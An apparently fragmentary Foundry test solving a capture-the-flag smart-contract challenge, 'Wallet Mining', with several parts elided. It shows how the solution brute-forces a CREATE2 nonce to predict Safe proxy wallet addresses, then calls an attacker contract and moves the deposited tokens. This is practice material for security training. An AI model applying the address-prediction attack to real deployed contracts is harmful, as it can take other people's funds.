...
import {WalletMiningAttacker} from "./Attacker.sol";
...
contract WalletMiningChallenge is Test {
    ...
    function test_walletMining() public checkSolvedByPlayer {
        (uint256 nonce, bytes memory initializer) = guessNonce();
        ...
        attacker.attack();
        token.transfer(user, DEPOSIT_TOKEN_AMOUNT);
    }

    function walletAddressForNonce(
        bytes memory initializer,
        uint256 nonce
    ) internal view returns (address) {
        // This matches SafeProxyFactory logic
        bytes memory creationCode = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(address(singletonCopy)))
        );

        // Matches how SafeProxyFactory derives salt
        bytes32 salt = keccak256(
            abi.encodePacked(keccak256(initializer), nonce)
        );

        // Standard CREATE2 address computation
    ...
    function guessNonce() public returns (uint256, bytes memory) {
        ...
        // Try different nonces until we hit the right address
        for (uint256 i = 0; i < 100; i++) {
            address predicted = walletAddressForNonce(initializer, i);
